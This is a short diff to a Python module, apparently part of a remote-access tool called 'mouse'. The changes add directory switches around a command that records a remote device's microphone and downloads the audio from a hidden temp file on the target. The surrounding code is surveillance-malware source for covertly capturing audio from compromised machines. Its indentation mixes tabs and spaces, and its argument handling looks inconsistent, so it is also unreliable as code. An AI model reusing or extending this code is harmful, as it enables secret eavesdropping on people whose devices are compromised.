@@ -40,6 +40,8 @@ class command:
                     print self.usage
             	    return
 		
+	w = os.environ['OLDPWD']
+        os.chdir(w)
         if cmd_data['args'] == "stop":
 	    dest = cmd_data['args'][1]
             if os.path.isdir(dest):
@@ -48,6 +50,8 @@ class command:
                     result = json.loads(session.send_command(cmd_data))
                     if 'error' in result:
                         h.info_error("Failed to record mic!")
+			g = os.environ['HOME']
+        		os.chdir(g + "/mouse")
 			return
                     elif 'status' in result and result['status'] == 1:
                         data = session.download_file("/tmp/.avatmp")
@@ -73,6 +77,8 @@ class command:
                         result = json.loads(session.send_command(cmd_data))
                         if 'error' in result:
                             h.info_error("Failed to record mic!")
+			    g = os.environ['HOME']
+        		    os.chdir(g + "/mouse")
 			    return
                         elif 'status' in result and result['status'] == 1:
                             data = session.download_file("/tmp/.avatmp")
@@ -90,3 +96,5 @@ class command:
         elif cmd_data['args'].split()[0] == "start":
             h.info_general("Recording mic...")
             h.info_general(session.send_command(cmd_data))
+	g = os.environ['HOME']
+        os.chdir(g + "/mouse")
